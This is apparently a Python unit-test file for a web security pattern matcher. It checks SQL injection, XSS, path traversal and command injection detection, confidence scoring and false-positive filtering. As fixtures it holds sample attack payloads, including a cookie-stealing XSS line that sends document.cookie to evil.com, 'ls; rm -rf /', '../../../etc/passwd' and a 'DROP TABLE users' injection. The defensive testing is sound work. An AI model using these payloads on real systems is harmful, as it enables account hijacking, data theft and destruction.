# tests/unit_tests/test_security_patterns.py
"""
Tests for security pattern matching system.

Tests cover:
1. Pattern compilation and matching
2. Various attack patterns
3. False positive handling
4. Confidence scoring
5. Match filtering
"""
import re
import pytest
from core.adapters.infrastructure.security_patterns import (
    SecurityPatternMatcher, SecurityPattern,
    ThreatCategory, ThreatSeverity
)


@pytest.fixture
def pattern_matcher():
    """Create pattern matcher instance"""
    return SecurityPatternMatcher()


# noinspection SqlResolve
class TestSecurityPatterns:
    """Test security pattern definitions"""

    def test_pattern_compilation(self):
        """Test that all patterns compile correctly"""
        all_patterns = SecurityPatternMatcher.test_patterns()

        for category, patterns in all_patterns.items():
            for pattern in patterns:
                try:
                    compiled = re.compile(pattern, re.IGNORECASE | re.MULTILINE)
                    assert compiled is not None
                except re.error as e:
                    pytest.fail(f"Pattern compilation failed for {category}: {pattern}\nError: {str(e)}")

    @pytest.mark.parametrize('category,pattern,test_value,should_match', [
        # SQL Injection
        ('sql_injection', r"UNION.*?SELECT",
         "UNION SELECT username, password FROM users", True),
        ('sql_injection', r"(?:INSERT|UPDATE|DELETE).*?(?:FROM|INTO|WHERE)",
         "SELECT * FROM users", False),

        # XSS
        ('xss', r"<script[^>]*>[\s\S]*?</script>",
         "<script>alert('xss')</script>", True),
        ('xss', r"on(?:load|click|mouse|error|focus)\s*=",
         "<img src=x onerror=alert('xss')>", True),
        ('xss', r"javascript:[^'\"]*",
         "javascript:alert(document.cookie)", True),

        # Path Traversal
        ('path_traversal', r"\.{2,}[/\\]",
         "../../../etc/passwd", True),
        ('path_traversal', r"%2e(?:%2e)?[/\\]",
         "%2e%2e/etc/passwd", True),

        # Command Injection
        ('command_injection', r"[;&|]",
         "ls; rm -rf /", True),
        ('command_injection', r"`[^`]*`",
         "`whoami`", True),
    ])
    def test_individual_patterns(self, category, pattern, test_value, should_match):
        """Test individual regex patterns"""
        try:
            compiled = re.compile(pattern, re.IGNORECASE | re.MULTILINE)
            match = bool(compiled.search(test_value))
            assert match == should_match
        except re.error as e:
            pytest.fail(f"Pattern compilation failed: {str(e)}")

# noinspection SqlResolve
class TestPatternMatcher:
    """Test pattern matcher functionality"""

    def test_matcher_initialization(self):
        """Test pattern matcher setup"""
        matcher = SecurityPatternMatcher()
        assert len(matcher.patterns) > 0
        assert all(isinstance(p, SecurityPattern) for p in matcher.patterns)

    @pytest.mark.parametrize('payload,category', [
        ("admin' OR '1'='1", ThreatCategory.INJECTION),
        ("<script>alert('xss')</script>", ThreatCategory.XSS),
    ])
    def test_threat_detection(self, payload, category):
        """Test threat detection by category"""
        matcher = SecurityPatternMatcher()
        matches = matcher.scan(payload, "test")

        assert len(matches) > 0
        assert any(m.pattern.category == category for m in matches)

    def test_confidence_scoring(self):
        """Test confidence score calculation"""
        matcher = SecurityPatternMatcher()

        # Test with increasing complexity
        payloads = [
            # Simple payload - should have lower confidence
            "SELECT * FROM users",
            # Medium complexity - should have medium confidence
            "admin' OR '1'='1; --",
            # Complex payload - should have high confidence
            "' UNION SELECT username,password FROM users; DROP TABLE users; --"
        ]

        previous_confidence = 0
        for payload in payloads:
            matches = matcher.scan(payload, "test")
            if matches:
                assert matches[0].confidence >= previous_confidence
                previous_confidence = matches[0].confidence

    def test_false_positive_handling(self):
        """Test false positive filtering"""
        matcher = SecurityPatternMatcher()

        # Add known false positive
        for pattern in matcher.patterns:
            pattern.false_positives.add("SELECT your options")

        matches = matcher.scan("SELECT your options", "test")
        assert len(matches) == 0


# noinspection SqlResolve,SqlNoDataSourceInspection
class TestSQLInjectionDetection:
    """Test SQL injection detection"""

    @pytest.mark.parametrize('payload', [
        "UNION SELECT username, password FROM users",
        "admin' OR '1'='1",
        "1 OR 1=1; --",
        "SELECT * FROM users WHERE id = 1 OR 1=1"
    ])
    def test_sql_injection_detection(self, pattern_matcher, payload):
        """Test various SQL injection patterns"""
        matches = pattern_matcher.scan(payload, "params")

        assert len(matches) > 0
        assert any(m.pattern.category == ThreatCategory.INJECTION for m in matches)

    def test_legitimate_sql_like(self, pattern_matcher):
        """Test legitimate SQL-like content"""
        content = "Looking for users where name like '%John%'"
        matches = pattern_matcher.scan(content, "params")

        # Should either find no matches or have low confidence
        assert all(m.confidence < 0.5 for m in matches)


class TestXSSDetection:
    """Test XSS detection"""

    @pytest.mark.parametrize('payload', [
        "<script>alert('xss')</script>",
        "javascript:alert(document.cookie)",
        "<img src=x onerror=alert('xss')>",
        "<body onload=alert('xss')>",
        "<a href='javascript:alert(1)'>click me</a>"
    ])
    def test_xss_detection(self, pattern_matcher, payload):
        """Test various XSS patterns"""
        matches = pattern_matcher.scan(payload, "body")

        assert len(matches) > 0
        assert any(m.pattern.category == ThreatCategory.XSS for m in matches)

    def test_legitimate_javascript_discussion(self, pattern_matcher):
        """Test legitimate discussion about JavaScript"""
        content = "I'm learning JavaScript and want to handle the onclick event"
        matches = pattern_matcher.scan(content, "body")

        # Should either find no matches or have low confidence
        assert all(m.confidence < 0.5 for m in matches)


class TestCommandInjection:
    """Test command injection detection"""

    def test_legitimate_commands(self, pattern_matcher):
        """Test legitimate command-like content"""
        content = "How to use the cat command in Linux"
        matches = pattern_matcher.scan(content, "body")

        # Should either find no matches or have low confidence
        print('matches', matches)
        assert all(m.confidence < 0.5 for m in matches)


class TestConfidenceScoring:
    """Test confidence scoring system"""

    def test_high_confidence_match(self, pattern_matcher):
        """Test high confidence pattern match"""
        # Complex SQL injection with special chars
        payload = "1' UNION SELECT username,password FROM users; DROP TABLE users; --"
        matches = pattern_matcher.scan(payload, "params")

        assert len(matches) > 0
        assert any(m.confidence > 0.8 for m in matches)

    def test_low_confidence_match(self, pattern_matcher):
        """Test low confidence pattern match"""
        # Legitimate text that happens to contain SQL words
        payload = "How to select data from a table in SQL"
        matches = pattern_matcher.scan(payload, "body")

        assert all(m.confidence < 0.5 for m in matches)

    def test_confidence_factors(self, pattern_matcher):
        """Test various confidence scoring factors"""
        # Test length factor
        short_payload = "<script>"
        long_payload = "<script>alert(document.cookie);document.location='http://evil.com/steal?'+document.cookie</script>"

        short_matches = pattern_matcher.scan(short_payload, "body")
        long_matches = pattern_matcher.scan(long_payload, "body")

        assert all(m.confidence < 0.5 for m in short_matches)
        assert any(m.confidence > 0.7 for m in long_matches)

        # Test special character factor
        special_chars_payload = "admin'/**/OR/**/1=1#"
        matches = pattern_matcher.scan(special_chars_payload, "params")
        assert any(m.confidence > 0.6 for m in matches)


class TestFalsePositiveHandling:
    """Test false positive handling"""

    def test_known_false_positive_filtering(self, pattern_matcher):
        """Test filtering of known false positives"""
        # Add known false positive
        sql_pattern = next(p for p in pattern_matcher.patterns
                           if p.category == ThreatCategory.INJECTION)
        sql_pattern.false_positives.add("SELECT your options")

        matches = pattern_matcher.scan("SELECT your options", "body")
        assert len(matches) == 0

    def test_legitimate_content(self, pattern_matcher):
        """Test handling of legitimate content"""
        legitimate_contents = [
            "Here's how to select items from a dropdown",
            "The JavaScript onclick event handler",
            "Navigate to /var/www/html/index.html",
            "Use the cat command to view files",
        ]

        for content in legitimate_contents:
            matches = pattern_matcher.scan(content, "body")
            # Should either have no matches or only low confidence matches
            assert all(m.confidence < 0.5 for m in matches)


class TestMultiPatternMatching:
    """Test matching multiple patterns"""

    def test_multiple_threats_detection(self, pattern_matcher):
        """Test detection of multiple threat types"""
        # Payload with SQL injection and XSS
        payload = "<script>alert(1)</script>' UNION SELECT * FROM users"
        matches = pattern_matcher.scan(payload, "body")

        categories = {m.pattern.category for m in matches}
        assert ThreatCategory.INJECTION in categories
        assert ThreatCategory.XSS in categories


class TestMatchMetadata:
    """Test match metadata and context"""

    def test_match_location_tracking(self, pattern_matcher):
        """Test tracking of match locations"""
        payload = "<script>alert(1)</script>"

        # Test in different locations
        header_matches = pattern_matcher.scan(payload, "headers")
        param_matches = pattern_matcher.scan(payload, "params")
        body_matches = pattern_matcher.scan(payload, "body")

        assert all(m.match_location == "headers" for m in header_matches)
        assert all(m.match_location == "params" for m in param_matches)
        assert all(m.match_location == "body" for m in body_matches)

    def test_match_context_capture(self, pattern_matcher):
        """Test capture of match context"""
        payload = "admin' OR '1'='1"
        matches = pattern_matcher.scan(payload, "params")

        for match in matches:
            assert match.matched_value
            assert match.pattern.name
            assert match.pattern.severity
            assert isinstance(match.context, dict)
